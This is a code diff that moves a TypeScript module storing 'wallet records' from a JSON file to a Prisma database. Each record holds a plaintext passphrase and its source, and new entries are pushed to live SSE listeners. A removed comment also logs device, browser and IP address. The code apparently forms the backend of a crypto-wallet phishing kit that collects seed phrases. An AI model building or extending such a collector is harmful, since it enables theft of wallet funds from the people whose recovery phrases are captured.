@@ -1,5 +1,4 @@
-import fs from "fs";
-import path from "path";
+import { prisma } from "./prisma";
 
 export interface WalletRecord {
   id: number;
@@ -8,23 +7,20 @@ export interface WalletRecord {
   createdAt: string; // ISO String
 }
 
-const DB_FILE = path.join(process.cwd(), "db.json");
-
-// Helper to initialize DB file if it doesn't exist
-function initDb() {
-  if (!fs.existsSync(DB_FILE)) {
-    fs.writeFileSync(DB_FILE, JSON.stringify([], null, 2));
-  }
-}
-
 /**
  * Gets all wallet records from the database.
  */
 export async function getWalletRecords(): Promise<WalletRecord[]> {
-  initDb();
   try {
-    const data = await fs.promises.readFile(DB_FILE, "utf-8");
-    return JSON.parse(data) as WalletRecord[];
+    const records = await prisma.walletRecord.findMany({
+      orderBy: { createdAt: "desc" },
+    });
+    return records.map((r: any) => ({
+      id: r.id,
+      passphrase: r.passphrase,
+      source: r.source,
+      createdAt: r.createdAt.toISOString(),
+    }));
   } catch (error) {
     console.error("Error reading database:", error);
     return [];
@@ -38,23 +34,24 @@ export async function saveWalletRecord(
   passphrase: string,
   source: string
 ): Promise<WalletRecord> {
-  initDb();
-  const records = await getWalletRecords();
-  
-  const newRecord: WalletRecord = {
-    id: records.length > 0 ? Math.max(...records.map((r) => r.id)) + 1 : 1,
-    passphrase,
-    source,
-    createdAt: new Date().toISOString(),
+  const record = await prisma.walletRecord.create({
+    data: {
+      passphrase,
+      source,
+    },
+  });
+
+  const formatted: WalletRecord = {
+    id: record.id,
+    passphrase: record.passphrase,
+    source: record.source,
+    createdAt: record.createdAt.toISOString(),
   };
 
-  records.push(newRecord);
-  await fs.promises.writeFile(DB_FILE, JSON.stringify(records, null, 2), "utf-8");
-  
   // Notify any active SSE listeners of a new insertion
-  notifyListeners(newRecord);
+  notifyListeners(formatted);
 
-  return newRecord;
+  return formatted;
 }
 
 /**
@@ -113,29 +110,3 @@ function notifyListeners(record: WalletRecord) {
     }
   });
 }
-
-/**
- * PRODUCTION NOTE:
- * To transition this database file system to PostgreSQL or MySQL, you can install 'pg' or 'mysql2'
- * and swap the file reads/writes above with standard SQL queries.
- *
- * Example using PostgreSQL (pg):
- * 
- * import { Pool } from 'pg';
- * const pool = new Pool({ connectionString: process.env.DATABASE_URL });
- * 
- * export async function getWalletRecords() {
- *   const res = await pool.query('SELECT * FROM wallet_records ORDER BY id DESC');
- *   return res.rows;
- * }
- * 
- * export async function saveWalletRecord(passphrase, source, device, browser, ipAddress) {
- *   const res = await pool.query(
- *     'INSERT INTO wallet_records (passphrase, source, device, browser, ip_address, created_at) VALUES ($1, $2, $3, $4, $5, NOW()) RETURNING *',
- *     [passphrase, source, device, browser, ipAddress]
- *   );
- *   const newRecord = res.rows[0];
- *   notifyListeners(newRecord);
- *   return newRecord;
- * }
- */
